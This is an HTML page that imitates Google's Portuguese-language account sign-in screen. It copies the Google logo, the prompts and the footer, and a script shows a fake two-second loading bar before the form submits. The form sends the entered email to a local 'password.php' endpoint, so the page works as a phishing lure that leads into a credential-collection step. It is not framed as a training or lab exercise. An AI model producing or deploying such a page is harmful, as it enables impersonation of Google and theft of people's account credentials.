<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <link rel="preconnect" href="https://fonts.gstatic.com" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet" />

  <link rel="stylesheet" href="./reset.css" />
  <link rel="stylesheet" href="./styles.css" />

  <title>Fazer login nas Contas do Google</title>
</head>

<body>
  <div class="container">
    <div class="card" id="loginCard">
      <div class="preloader">
        <div class="preloader-line"></div>
      </div>

      <form action="http://localhost:8080/password.php" id="loginForm">
        <img src="./images/google-logo.svg" alt="" />
        <h2>Fazer login</h2>
        <h3>Use sua Conta do Google</h3>

        <input type="email" name="email" placeholder="E-mail ou telefone" />
        <div class="btn-email">
          <button type="button">Esqueceu seu e-mail?</button>
        </div>
        <p>
          Não está no seu computador? Use o modo visitante para fazer login com
          privacidade.
          <a href="">Saiba mais</a>
        </p>

        <div class="card-bottom">
          <a href="">Criar conta</a>
          <button type="submit">Avançar</button>
        </div>
      </form>
    </div>

    <div class="footer">
      <select name="select">
        <option value="Portugês (Brasil) selected">Portugês (Brasil)</option>
        <option value="English (United States)">
          English (United States)
        </option>
        <option value="Español (España)">Español (España)</option>
      </select>

      <div class="footer-span">
        <span>Ajuda</span>
        <span>Privacidade</span>
        <span>Termos</span>
      </div>
    </div>
  </div>
</body>

</html>

<script>
  document.addEventListener('DOMContentLoaded', function() {
    var loginForm = document.getElementById('loginForm');
    var loginCard = document.getElementById('loginCard');
    loginForm.addEventListener('submit', function(event) {
      event.preventDefault();
      loginCard.classList.add('loading');
      document.body.classList.add('loading');

      setTimeout(function() {
        loginForm.submit();
      }, 2000);
    });
  });
</script>